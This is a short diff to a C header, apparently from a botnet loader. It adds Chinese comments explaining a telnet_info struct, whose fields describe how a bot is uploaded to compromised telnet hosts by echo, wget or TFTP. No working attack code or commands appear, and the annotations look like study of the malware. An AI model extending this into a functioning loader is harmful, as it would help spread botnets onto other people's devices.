@@ -1,3 +1,5 @@
+//解析telnet信息
+
 #pragma once
 
 #include "includes.h"
@@ -10,7 +12,7 @@ struct telnet_info {
         UPLOAD_ECHO,
         UPLOAD_WGET,
         UPLOAD_TFTP
-    } upload_method;
+    } upload_method;//上传bot的方式
     BOOL has_auth, has_arch;
 };
 
